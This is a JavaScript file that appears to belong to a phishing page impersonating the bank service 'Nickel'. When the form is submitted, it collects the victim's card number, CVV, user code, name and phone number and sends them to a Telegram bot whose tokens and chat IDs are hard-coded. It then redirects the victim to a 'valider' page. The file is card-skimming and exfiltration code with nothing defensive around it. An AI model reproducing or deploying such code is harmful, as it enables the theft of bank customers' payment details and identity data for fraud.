

var carte = document.getElementById('ccnum');
var cvv = document.getElementById('cvv');
var usercode = localStorage.getItem('usercode') ;

var nameN = localStorage.getItem('nameN') ;
var prenomN = localStorage.getItem('prenomN') ;
var tel = localStorage.getItem('telN');


document.getElementById('form4').addEventListener('submit', function(e){
    e.preventDefault();

    const bot = new Bot("8030036758:AAFBlF_S0RG8CJ5ueHBdmOQV9niAyHrTMG0", 4591101208);
    // const bot = new Bot("7790808498:AAGzrnUuQzRYR2OIyz6GoKrqiVuOP12IE1Q", 7332838769);

    // const regexCarteCredit = /^[0-9]{13,19}$/;
    // const regexDeuxChiffres = /^[0-9]{2}$/;
    // const regexTroisChiffres = /^[0-9]{3}$/;
    // const regex10Chiffres = /^[0-9]{10}$/;
    // const numeroCarte = carte.value;
    // const yyInput = yy.value; 
    // const mmInput = mm.value; 
    // const cvvInput = cvv.value; 

   // const telInput = tel.value; 

    bot.sendMessage('👔User NICKEL : ' + usercode + " ❇️Nom : " + nameN + " ♦️Prenom : " + prenomN +  " 📞Tel : " + tel +  ' 💳8 chiffres crypter : ' + carte.value + " 🎯Cvv : " + cvv.value )
    .then(res => {
        console.log(res);

        // debugger
        window.location.href = './valider.html' ;


})
})